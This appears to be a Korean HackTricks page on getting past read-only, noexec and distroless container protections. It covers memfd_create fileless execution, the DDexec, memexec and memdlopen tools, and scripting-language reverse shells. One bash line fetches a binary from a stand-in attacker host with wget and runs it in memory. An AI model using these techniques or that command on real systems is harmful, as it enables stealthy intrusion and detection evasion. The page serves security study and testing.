# FS protections 우회: read-only / no-exec / Distroless

## Videos

다음 Videos에서 이 페이지에 언급된 technique을 더 자세히 설명합니다:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec 시나리오

컨테이너에서는 security context에서 **`readOnlyRootFilesystem: true`**를 설정하여 root filesystem을 read-only로 mount할 수 있습니다.<sup>[[3]](#references)</sup> 예시:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

read-only root라고 해서 별도로 mount된 volume까지 read-only가 되는 것은 아닙니다. Docker는 **`/dev/shm`**을 IPC mount로 처리하며, `rw` 및 `noexec`와 같은 tmpfs 옵션은 runtime configuration 선택 사항입니다. 어느 동작에 의존하기 전에 대상 container의 mount option을 확인하세요.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> red-team 관점에서 이러한 조합은 이미 사용 가능한 파일이 아닌 binary(예: backdoor 또는 enumeration tool)를 download하고 execute하기 어렵게 만들 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

## 가장 쉬운 우회: Scripts

`noexec` mount는 해당 mount에서 binary를 직접 execute하는 것을 차단하지만, interpreter는 여전히 script를 읽고 해석할 수 있습니다. 따라서 `sh` 또는 `python`이 있으면 해당 interpreter를 통해 shell 또는 Python script를 실행할 수 있습니다.<sup>[[5]](#references)</sup>

필요한 tool 자체가 binary인 경우에는 도움이 되지 않습니다.<sup>[[5]](#references)</sup>

## Memory Bypasses

mount된 path에서 직접 실행하는 것이 차단된 경우, 한 가지 방법은 ELF를 memory에 load한 다음 in-memory path를 통해 execute하는 것입니다. 이렇게 하면 해당 mount의 `noexec` check는 피할 수 있지만, 다른 kernel, permission 또는 policy control이 제거되는 것은 아닙니다.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

scripting runtime이 관련 Linux interface에 access할 수 있다면 **`memfd_create(2)`**를 사용하여 anonymous RAM-backed file descriptor를 생성하고, ELF bytes를 여기에 기록한 다음 fd-backed execution path를 사용할 수 있습니다. [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project는 이 workflow를 위한 압축 및 base64-encoded Python, Perl 또는 Ruby code를 생성합니다.<sup>[[6]](#references)[[7]](#references)</sup>

이 project는 현재 Python, Perl 및 Ruby target을 문서화하고 있습니다. PHP 또는 Node에는 다른 runtime-specific technique이나 extension이 필요하므로, 특정 language용 generator가 없다고 해서 in-memory execution이 불가능하다는 의미는 아닙니다.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> **`/dev/shm`**에 기록된 일반 executable은 해당 mount의 **`noexec`** 설정이 계속 적용됩니다. 단순히 일반 file descriptor를 통해 여는 것만으로는 mount policy가 변경되지 않습니다.<sup>[[5]](#references)</sup>
>
> 정확한 memory-execution method는 runtime, architecture, kernel 및 사용 가능한 permission에 따라서도 달라집니다.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)는 **`/proc/self/mem`**을 통해 실행 중인 shell process에 stager와 loader를 기록한 다음, 해당 code로 control을 transfer합니다.<sup>[[8]](#references)</sup>

이를 통해 process는 binary를 executable filesystem에 먼저 배치하지 않고도 제공된 binary를 load할 수 있습니다.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec**는 **memory**에서 shellcode 또는 binary를 load하고 **execute**할 수 있습니다.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
이 technique에 대한 자세한 정보는 Github 또는 다음을 확인하세요:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)는 daemonized DDexec 구현입니다. 해당 daemon은 arguments와 raw program bytes가 포함된 requests를 수신하고, 각 program을 load하고 run할 child를 fork하며, parent는 server로 유지합니다.<sup>[[9]](#references)</sup>

repository에는 [a.php](https://github.com/arget13/memexec/blob/main/a.php)에 **PHP reverse shell에서 memexec를 사용하여 binaries를 execute하는 예시**가 포함되어 있습니다.<sup>[[9]](#references)</sup>

### Memdlopen

DDexec와 유사한 목적을 가진 [**memdlopen**](https://github.com/arget13/memdlopen)은 shared object 또는 program을 위한 fileless `dlopen()` 구현입니다. 현재 README에는 ARM64 support가 문서화되어 있으므로 사용하기 전에 target architecture를 확인하세요.<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless가 실제로 무엇인지**, 언제 도움이 되고 언제 도움이 되지 않는지, 그리고 이것이 containers에서 post-exploitation tradecraft를 어떻게 바꾸는지에 대한 전용 설명은 다음을 확인하세요:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### distroless란

Distroless images에는 application과 해당 runtime dependencies만 포함됩니다. official images에는 package managers, shells 및 표준 Linux distribution에서 일반적으로 기대되는 기타 programs가 제외되어 있습니다.<sup>[[11]](#references)</sup>

runtime image를 이러한 dependencies로만 유지하면 production에 존재하는 software와 scan하고 track해야 하는 항목의 양을 줄일 수 있습니다.<sup>[[11]](#references)</sup>

### Reverse Shell

distroless container에서는 일반적인 shell을 위한 **`sh` 또는 `bash`**를 찾지 못할 수 있으며, `ls`, `whoami`, `id`와 같은 common utilities도 없을 수 있습니다.<sup>[[11]](#references)</sup>

> [!WARNING]
> 따라서 일반적인 shell-based reverse shell 또는 utility-based enumeration이 작동하지 않을 수 있습니다.<sup>[[11]](#references)</sup>

compromised application에 language runtime이 포함되어 있다면(예: Flask application을 위한 Python 또는 Node application을 위한 Node.js), RCE가 해당 runtime을 사용하여 command channel을 확보하고 API를 통해 system inspection을 수행할 수 있습니다.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 사용 가능한 scripting language를 활용하여 해당 language capabilities를 통해 **system을 enumerate**하세요.<sup>[[12]](#references)</sup>

**read-only/no-exec** protections가 없다면 command channel이 writable하고 executable한 mount에 binaries를 write한 뒤 run할 수 있습니다. 먼저 mount options와 permissions를 확인하세요.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> 이러한 protections가 존재하는 경우 runtime, kernel 및 permissions가 허용하는 범위에서 위의 **memory-execution techniques**를 사용하세요.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE vulnerabilities를 exploit하여 scripting-language **reverse shells**를 확보하고 memory에서 binaries를 execute하는 **examples**는 [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 확인할 수 있습니다.<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Stealth와 Evasion을 위한 Linux Memory Manipulation 탐구](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng 및 in-memory dlopen()을 사용한 Stealth intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod 또는 Container를 위한 Security Context 구성](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
